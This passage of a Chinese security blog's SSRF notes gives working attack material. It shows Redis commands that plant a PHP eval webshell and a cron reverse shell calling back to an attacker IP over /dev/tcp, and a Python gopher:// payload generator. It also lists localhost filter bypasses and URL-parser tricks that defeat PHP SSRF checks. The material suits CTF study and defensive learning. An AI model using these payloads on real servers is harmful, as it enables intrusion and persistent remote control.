<p>redis 使用 RESP 协议通信</p>
</blockquote>
<p>绝对路径写 Webshell 的 redis 命令如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall    # 清理 Redis 缓存，确保环境干净</span><br><span class="line">set 1 &#x27;&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;&#x27;   # 设置键名为 1 的 PHPWebshell</span><br><span class="line">config set dir /var/www/html    # 将 Redis 的工作目录修改为 web 服务器根目录</span><br><span class="line">config set dbfilename shell.php # 将 Redis 的数据库文件名修改为 shell.php，这意味着 Redis 将在保存数据库快照（RDB 文件）时生成一个名为 shell.php 的文件</span><br><span class="line">save    //保存配置文件，执行快照保存操作。这会将当前 Redis 数据库中的所有键值对保存到 dir 指定的目录下，并以 dbfilename 指定的文件名命名</span><br></pre></td></tr></table></figure>

<p>创建计划任务反弹 Shell 的 redis 命令如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#x27;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\n\n&#x27;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br><span class="line">​</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">47.xxx.xxx.72为攻击者vps的IP</span></span><br></pre></td></tr></table></figure>

<p>然后使用脚本将其转化为 Gopher 协议的格式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.52.131&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_POST[\&quot;whoami\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="built_in">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将生成的 payload 要进行 url 二次编码</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Gopherus 生成 payload<img src="/2022/10/18/SSRF/redis.png" class="" title="redis"></li>
</ul>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48904485/article/details/123653514">SSRF漏洞详解</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121667791">gopher协议总结</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e0f6ef3ea833">SSRF漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nobugnomoney/article/details/123953973">ctf中的ssrf</a></p>
<h1 id="常见绕过方法"><a href="#常见绕过方法" class="headerlink" title="常见绕过方法"></a>常见绕过方法</h1><h3 id="进制转换绕过内网-IP-（过滤-127-0-0-x2F-localhost"><a href="#进制转换绕过内网-IP-（过滤-127-0-0-x2F-localhost" class="headerlink" title="进制转换绕过内网 IP （过滤 127.0.0&#x2F;localhost"></a>进制转换绕过内网 IP （过滤 127.0.0&#x2F;localhost</h3><ul>
<li>任意数量的 0 绕过：127.00000.00000.001</li>
<li>十六进制绕过：<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0x7F000001</a></li>
<li>十进制绕过：<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://2130706433</a></li>
<li>八进制绕过：<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0177.0000.0000.0001</a></li>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1/</a></li>
<li>127.0.0.1 ~ 127.255.255.254 都表示 localhost (?</li>
<li><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0</a></li>
<li>http:&#x2F;&#x2F;[::]:80&#x2F;  （Linux 下可用）</li>
<li>中文句号绕过：<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127。0。0。1/</a></li>
<li>花符号：http:&#x2F;&#x2F;①②⑦.⓪.⓪.①</li>
<li>使用sudo.cc代替：url&#x3D;<a target="_blank" rel="noopener" href="http://sudo.cc/">http://sudo.cc/</a></li>
<li>通过ip地址解析为127.0.0.1的网站进行绕过：<a target="_blank" rel="noopener" href="http://spoofed.burpcollaborator.net/">http://spoofed.burpcollaborator.net/</a></li>
</ul>
<h3 id="符绕过-IP"><a href="#符绕过-IP" class="headerlink" title="@ 符绕过 IP"></a>@ 符绕过 IP</h3><p>对于一个 url 的访问实际上是以 @ 符后为准的</p>
<p>如果目标代码限制访问的域名只能为 <a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a></p>
<p>那么我们可以采用HTTP基本身份认证的方式绕过</p>
<p>即构造 <a target="_blank" rel="noopener" href="http://www.xxx.com@10.10.10.10,则实际上访问的是/">http://www.xxx.com@10.10.10.10，则实际上访问的是</a> 10.10.10.10 这个地址</p>
<h3 id="302跳转绕过-IP"><a href="#302跳转绕过-IP" class="headerlink" title="302跳转绕过 IP"></a>302跳转绕过 IP</h3><h4 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h4><p>网络上存在一个很神奇的服务，网址为 <a target="_blank" rel="noopener" href="http://xip.io,当访问这个服务的任意子域名的时候,都会重定向到这个子域名/">http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名</a></p>
<p>当我们在网址后面加 xip.io，例如 <a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io/flag.php">http://127.0.0.1.xip.io/flag.php</a> 会被解析成 <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p>
<p>类似的网址还有 <a target="_blank" rel="noopener" href="http://nip.io、http//sslip.io">http://nip.io、http://sslip.io</a></p>
<h4 id="短地址跳转"><a href="#短地址跳转" class="headerlink" title="短地址跳转"></a>短地址跳转</h4><p>利用短地址生成网站，生成短连接，访问短链接会自动跳转到目标网址上，以此绕过 waf</p>
<h3 id="利用-URL-的解析问题"><a href="#利用-URL-的解析问题" class="headerlink" title="利用 URL 的解析问题"></a>利用 URL 的解析问题</h3><h4 id="readfile-和-parse-url-函数的解析差异"><a href="#readfile-和-parse-url-函数的解析差异" class="headerlink" title="readfile 和 parse_url 函数的解析差异"></a><code>readfile</code> 和 <code>parse_url</code> 函数的解析差异</h4><p>测试代码如下，同时，在 11211 端口下运行一个 web 服务，存在一个 flag.txt 文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://&#x27;</span>. <span class="variable">$_GET</span>[url];</span><br><span class="line"><span class="variable">$parsed</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$parsed</span>[port] == <span class="number">80</span> )&#123;  <span class="comment">// 限制传过去的url只能是80端口</span></span><br><span class="line">	<span class="title function_ invoke__">readfile</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Hacker!&#x27;</span>);</span><br><span class="line">&#125;`</span><br></pre></td></tr></table></figure>


<p>由于代码限制我们传过去的 url 端口只能是 80，如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=127.0.0.1:11211:80/flag.txt</span><br></pre></td></tr></table></figure>

<p>这是因为利用了两个函数解析端口的方式不同：<code>readfile()</code> 函数获取的端口是最后冒号前面的一部分（11211），而 <code>parse_url()</code> 函数获取的则是最后冒号后面的的端口（80），如下图所示：</p>
<img src="/2022/10/18/SSRF/parse_port.png" class="" title="Abusing URL Parsers">

<p>此外， <code>readfile()</code> 和 <code>parse_url()</code> 在解析 host 的时候也有差异，如下图所示：</p>
<img src="/2022/10/18/SSRF/parse_host.png" class="" title="Abusing URL Parsers">

<p>利用这种差异，可以尝试绕过题目中 <code>parse_url()</code> 函数对指定 host 的限制</p>
<h4 id="curl-和-parse-url-函数的解析差异"><a href="#curl-和-parse-url-函数的解析差异" class="headerlink" title="curl 和 parse_url 函数的解析差异"></a><code>curl</code> 和 <code>parse_url</code> 函数的解析差异</h4><p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;<span class="comment">// 检查是否是内网ip</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上述代码中，<code>check_inner_ip</code> 函数通过 <code>url_parse()</code> 函数检测是否为内网 IP，如果不是内网 IP ，则通过 <code>curl()</code> 请求 url 并返回结果</p>
<p>我们可以利用 <code>curl</code> 和 <code>parse_url</code> 解析的差异不同来绕过这里的限制，让 <code>parse_url()</code> 处理外部网站网址，最后 <code>curl()</code> 请求内网网址</p>
<p>payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php</span><br></pre></td></tr></table></figure>

<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260806.html">CTF SSRF 漏洞从0到1 - FreeBuf</a></li>
</ol>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-10-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/10/18/SSRF/,Mini's blog,SSRF,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/10/21/DNS%E5%A4%96%E5%B8%A6/" title="DNS外带">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/10/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>